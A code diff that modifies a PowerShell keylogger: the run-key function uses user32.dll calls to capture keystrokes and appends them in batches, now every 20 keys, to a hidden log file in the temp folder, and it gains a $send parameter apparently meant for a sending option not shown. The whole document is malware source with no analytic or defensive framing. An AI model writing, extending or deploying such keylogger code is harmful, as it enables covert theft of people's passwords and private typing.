@@ -1,4 +1,4 @@
-function run-key()
+function run-key([Int]$send)
 {
   $signatures = @'
         [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
@@ -12,7 +12,6 @@ function run-key()
 '@
   $API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru
   [Int]$counter = 0
-  [Int]$send = 0
   [Int]$end = 0
   [String]$lista = ""
   try
@@ -36,7 +35,7 @@ function run-key()
             # add key to logger file
             $lista += $mychar
             $counter++
-            if ($counter -ge 10)
+            if ($counter -ge 20)
             {
               $counter = 0
               cmd.exe /c "echo $lista>>%temp%\log.dat"
@@ -68,8 +67,8 @@ function run-key()
     {
       cmd.exe /c "echo $lista>>%temp%\log.dat"
       $lista = ""
-      run-key
+      run-key $send
     }
   }
 }
-run-key
+run-key 0
